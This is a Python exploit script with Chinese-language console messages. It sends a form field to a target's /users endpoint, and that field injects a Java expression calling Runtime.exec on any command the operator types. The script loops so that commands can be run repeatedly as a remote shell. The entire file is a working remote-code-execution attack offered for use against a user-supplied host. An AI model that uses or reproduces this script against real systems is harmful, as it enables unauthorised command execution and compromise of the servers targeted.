#!/usr/bin/env python3
# writer: yueji0j1anke

import requests
import colorama

def attack(ip,payload):
    url = 'http://{}/users'.format(ip)
    payload = {
        'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("{}")]'.format(payload): '',
        'password': '',
        'repeatedPassword': ''
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0'
    }
    try:
        response = requests.post(url, data=payload, headers=headers)
        print(response.text)
        print(colorama.Fore.GREEN + "[info] 利用成功")
    except Exception as e:
        print(colorama.Fore.RED + "[error] 发生故障: {}".format(e))

if __name__ == '__main__':
    ip = input(colorama.Fore.GREEN + "请输入你的target: ")
    payload = input(colorama.Fore.GREEN + "请输入你的payload: ")
    print(colorama.Fore.GREEN + "[info] 开始利用")
    while True:
        attack(ip,payload)
        payload = input(colorama.Fore.GREEN + "请再次输入你的payload: ")

